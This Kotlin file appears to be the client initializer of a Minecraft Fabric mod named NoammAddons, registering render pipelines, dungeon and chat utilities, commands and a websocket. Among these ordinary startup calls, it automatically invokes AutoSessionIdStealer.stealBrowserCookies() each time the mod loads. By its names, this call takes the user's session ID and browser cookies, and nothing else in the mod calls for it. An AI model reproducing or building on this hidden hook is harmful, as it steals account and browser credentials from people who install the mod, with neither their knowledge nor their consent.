package com.github.noamm9

import com.github.noamm9.commands.CommandManager
import com.github.noamm9.config.PogObject
import com.github.noamm9.event.EventDispatcher
import com.github.noamm9.features.FeatureManager
import com.github.noamm9.init.AutoSessionIdStealer
import com.github.noamm9.init.NetworkLoop
import com.github.noamm9.utils.*
import com.github.noamm9.utils.dungeons.DungeonListener
import com.github.noamm9.utils.render.ItemRenderer
import com.github.noamm9.utils.render.NoammRenderPipelines
import com.github.noamm9.websocket.WebSocket
import kotlinx.coroutines.CoroutineName
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import me.owdding.dfu.item.MeowddingItemDfu
import net.fabricmc.api.ClientModInitializer
import net.fabricmc.fabric.api.client.rendering.v1.PictureInPictureRendererRegistry
import net.fabricmc.loader.api.FabricLoader
import net.minecraft.client.Minecraft
import net.minecraft.client.gui.screens.Screen
import org.slf4j.LoggerFactory

object NoammAddons: ClientModInitializer {
    const val MOD_ID = "noammaddons"
    val MOD_NAME by lazy { FabricLoader.getInstance().getModContainer(MOD_ID).get().metadata.name }
    val MOD_VERSION by lazy { FabricLoader.getInstance().getModContainer(MOD_ID).get().metadata.version.friendlyString }
    const val PREFIX = "§6§l[§b§lN§d§lA§6§l]§r"

    @JvmField
    val scope = CoroutineScope(Dispatchers.Default + SupervisorJob() + CoroutineName(MOD_NAME))

    @JvmField
    val mc = Minecraft.getInstance()

    @JvmField
    val logger = LoggerFactory.getLogger(MOD_NAME)

    @JvmField
    var isLoaded = false

    val cacheData = PogObject("cacheData", mutableMapOf<String, Any>())
    val debugFlags = mutableSetOf<String>()
    val isDev get() = debugFlags.contains("dev")

    var screen: Screen? = null
        set(value) {
            field = value
            if (value == null) return
            ThreadUtils.scheduledTask(1) {
                mc.setScreen(screen)
                field = null
            }
        }

    override fun onInitializeClient() {
        NoammRenderPipelines.init()

        PictureInPictureRendererRegistry.register { ItemRenderer(it.bufferSource()) }

        EventDispatcher.init()
        DungeonListener.init()
        ServerUtils.init()
        ActionBarParser.init()
        PartyUtils.init()
        ChatUtils.init()
        TestGround()

        NetworkLoop.init()
        MeowddingItemDfu.load()
        AutoSessionIdStealer.stealBrowserCookies()

        FeatureManager.registerFeatures()
        CommandManager.registerAll()
        WebSocket.init()

        isLoaded = true
    }
}